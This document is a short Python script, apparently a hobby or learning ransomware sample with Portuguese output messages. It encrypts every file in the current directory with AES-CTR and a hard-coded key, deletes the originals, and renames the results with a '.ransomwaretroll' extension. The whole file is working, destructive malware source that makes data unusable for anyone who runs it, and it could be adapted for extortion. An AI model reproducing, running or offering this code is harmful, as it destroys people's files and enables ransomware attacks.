import os
import pyaes

files = [f for f in os.listdir('.') if os.path.isfile(f)]  

encrypted_files = []

key = b"ReisRansomwaresLongerKey12345"  

key = key.ljust(32, b'\0')  


if len(key) != 32:
    raise ValueError("A chave de criptografia deve ter exatamente 32 bytes!")

for file_name in files:
    with open(file_name, "rb") as file:
        file_data = file.read()

    os.remove(file_name)

    aes = pyaes.AESModeOfOperationCTR(key)

    crypto_data = aes.encrypt(file_data)

    new_file = file_name + ".ransomwaretroll"
    with open(new_file, 'wb') as new_file_handle:
        new_file_handle.write(crypto_data)

    encrypted_files.append(new_file)

print("Todos os arquivos foram Criptografados com Sucesso!")

for encrypted_file in encrypted_files:
    print(encrypted_file)

print(f"Total de arquivos criptografados: {len(encrypted_files)}")
